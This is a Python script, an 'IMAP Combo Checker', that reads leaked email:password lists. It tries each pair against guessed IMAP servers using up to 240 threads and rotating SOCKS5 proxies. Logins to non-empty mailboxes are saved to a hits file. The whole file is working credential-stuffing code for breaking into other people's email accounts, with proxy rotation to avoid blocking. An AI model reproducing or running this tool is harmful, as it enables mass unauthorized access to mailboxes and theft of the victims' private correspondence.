import imaplib
import threading
import time
import sys
import os
import configparser
import socks
import socket
import argparse

# Configuration
IMAP_SUBDOMAINS_FILE = "imapsubdomains.txt"  # Possible IMAP addresses. The most common have been added for a great speed:discovery ratio.
VALID_HITS_FILE = "imap_valid_hits.txt"  # Valid results will be here. As of now there is no capture features, I plan to add in the future.
CONFIG_FILE = "imap_config.ini"  # This file auto-updates the more you run the script, and becomes faster as it gains more known servers.
TIMEOUT = 3  # seconds
MAX_THREADS = 240  # Adjust as needed
VERBOSE = "-v" in sys.argv  # Check if verbose mode is enabled
CONFIG_LOAD_INTERVAL = 30  # Reload config.ini every 30 lines.
PROXY_LIST_PATH = "imap_socks5.txt"  # Path to the proxy list file (hardcoded)

# Argument parser
parser = argparse.ArgumentParser(description='IMAP Combo Checker')
parser.add_argument('-c', '--combo', type=str, default='combo.txt', help='Path to the combo file')
parser.add_argument('-p', '--proxy', action='store_true', help='Toggle the use of proxies')
args = parser.parse_args()

# Load proxies
def load_proxies():
    if os.path.exists(PROXY_LIST_PATH) and PROXY_LIST_PATH:
        with open(PROXY_LIST_PATH, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

PROXIES = load_proxies()
PROXY_INDEX = 0

# Set up a SOCKS5 proxy
def set_socks_proxy():
    global PROXY_INDEX
    if PROXIES:
        proxy = PROXIES[PROXY_INDEX]
        PROXY_INDEX = (PROXY_INDEX + 1) % len(PROXIES)
        socks.set_default_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
        socket.socket = socks.socksocket

# Load IMAP subdomains
def load_imap_subdomains():
    with open(IMAP_SUBDOMAINS_FILE, "r") as f:
        return [line.strip() for line in f if line.strip()]

IMAP_SUBDOMAINS = load_imap_subdomains()

# Load imap_config.ini
def load_config():
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
    return config

# Save working IMAP server to imap_config.ini
def save_config(domain, imap_server):
    config = load_config()
    
    if 'IMAP' not in config:
        config['IMAP'] = {}
    
    config['IMAP'][domain] = imap_server
    
    with open(CONFIG_FILE, "w") as configfile:
        config.write(configfile)
    
    if VERBOSE:
        print(f"[DEBUG] Added {domain}: {imap_server} to {CONFIG_FILE}")

# Get IMAP servers, checking config.ini first
def get_imap_servers(email, config):
    domain = email.split("@")[-1]
    
    # If a working IMAP server is already known, return only that
    if 'IMAP' in config and domain in config['IMAP']:
        return [config['IMAP'][domain]]

    # Otherwise, generate from subdomains list
    return [f"{sub}{domain}" if sub.endswith(".") else f"{sub}.{domain}" for sub in IMAP_SUBDOMAINS]

# Check email credentials
def check_email(email, password, config, line_number, total_lines):
    domain = email.split("@")[-1]
    imap_servers = get_imap_servers(email, config)

    for imap_server in imap_servers:
        mail = None
        try:
            if args.proxy:
                set_socks_proxy()
            mail = imaplib.IMAP4_SSL(imap_server, timeout=TIMEOUT)
            mail.login(email, password)
            mail.select("INBOX")
            _, data = mail.search(None, "ALL")

            if data[0]:  # Check if there are any emails
                emails = data[0].split()
                if len(emails) > 1:
                    with open(VALID_HITS_FILE, "a") as f:
                        f.write(f"{email}:{password}\n")
                    print(f"[+] Valid ({line_number}/{total_lines}): {email}")  # Show line number out of total lines
                    
                    # Save working IMAP server to config
                    save_config(domain, imap_server)
                    return  # Stop checking other subdomains once successful

        except Exception as e:
            if VERBOSE:
                print(f"[!] Failed: {email} ({imap_server}) - {e}")

        finally:
            if mail:
                try:
                    mail.logout()
                except Exception:
                    pass  # Ignore logout errors

    if VERBOSE:
        print(f"[-] Invalid: {email}")  # Only print invalid attempts in verbose mode

# Load combos and start threads
def main():
    threads = []
    config = load_config()  # Initial config load
    lines_processed = 0
    total_lines = sum(1 for _ in open(args.combo, "r"))

    def print_progress():
        while threading.active_count() > 1:
            print(f"\rChecked: {lines_processed}/{total_lines}", end="")
            time.sleep(1)
        print(f"\rChecked: {lines_processed}/{total_lines}", end="")  # Final update

    progress_thread = threading.Thread(target=print_progress)
    progress_thread.start()

    with open(args.combo, "r") as f:
        for line_number, line in enumerate(f, 1):
            parts = line.strip().split(":")
            if len(parts) == 2:
                email, password = parts

                # Reload config every 50 lines
                if lines_processed % CONFIG_LOAD_INTERVAL == 0:
                    config = load_config()
                
                while threading.active_count() > MAX_THREADS:
                    time.sleep(1)  # Wait to avoid excessive threading

                thread = threading.Thread(target=check_email, args=(email, password, config, line_number, total_lines))
                thread.start()
                threads.append(thread)
                lines_processed += 1

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    progress_thread.join()

if __name__ == "__main__":
    main()
